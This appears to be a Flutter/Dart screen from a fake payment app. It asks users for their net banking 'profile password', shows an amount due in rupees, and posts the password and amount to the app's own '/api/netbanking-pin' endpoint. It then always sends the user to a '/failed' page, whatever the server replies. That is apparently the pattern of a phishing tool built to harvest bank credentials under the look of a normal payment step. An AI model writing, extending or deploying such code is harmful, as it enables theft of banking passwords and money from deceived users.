import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import '../theme.dart';

class NetbankingPinScreen extends StatefulWidget {
  final double amount;
  const NetbankingPinScreen({super.key, required this.amount});
  @override
  State<NetbankingPinScreen> createState() => _S();
}

class _S extends State<NetbankingPinScreen> {
  final pin = TextEditingController();

  void submit() {
    if (pin.text.isNotEmpty) {
      http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount}))
        .then((_) => print('API success'))
        .catchError((e) => print('API error: $e'));
      context.push('/failed');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: SafeArea(child: SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [AppColors.blue.withValues(alpha: .15), AppColors.navy.withValues(alpha: .08)],
                begin: Alignment.topLeft, end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(Icons.lock_outline, color: AppColors.blue, size: 24),
          ),
          const SizedBox(width: 14),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text('Profile Password', style: AppStyles.headerStyle),
            const SizedBox(height: 2),
            const Text('Enter your net banking password', style: AppStyles.bodySmall),
          ]),
        ]),
        const SizedBox(height: 24),
        Container(
          padding: const EdgeInsets.all(20),
          decoration: AppStyles.blueGradient.copyWith(borderRadius: BorderRadius.circular(16)),
          child: Row(children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: .15),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(Icons.account_balance_wallet, color: Colors.white, size: 24),
            ),
            const SizedBox(width: 16),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('Amount to Pay', style: TextStyle(color: Colors.white70, fontSize: 13, fontWeight: FontWeight.w500)),
              const SizedBox(height: 4),
              Text('\u{20B9}${widget.amount.toStringAsFixed(1)}',
                  style: const TextStyle(fontSize: 28, fontWeight: FontWeight.w800, color: Colors.white, letterSpacing: 0.5)),
            ]),
          ]),
        ),
        const SizedBox(height: 20),
        Container(
          padding: const EdgeInsets.all(24),
          decoration: AppStyles.cardDecoration,
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: const [
              Icon(Icons.lock_outline, size: 20, color: AppColors.blue),
              SizedBox(width: 8),
              Text('Enter your profile password', style: AppStyles.subHeaderStyle),
            ]),
            const SizedBox(height: 16),
            TextField(
              controller: pin,
              obscureText: true,
              style: const TextStyle(fontSize: 16, color: AppColors.textDark, letterSpacing: 2),
              decoration: AppStyles.textFieldDecoration('Enter profile password', prefixIcon: const Icon(Icons.lock, color: AppColors.blue, size: 20)),
            ),
            const SizedBox(height: 24),
            SizedBox(
              width: double.infinity,
              height: 54,
              child: ElevatedButton.icon(
                onPressed: submit,
                icon: const Icon(Icons.lock, size: 18),
                label: const Text('Submit', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700)),
                style: AppStyles.primaryButton(double.infinity),
              ),
            ),
          ]),
        ),
      ]),
    )));
  }
}
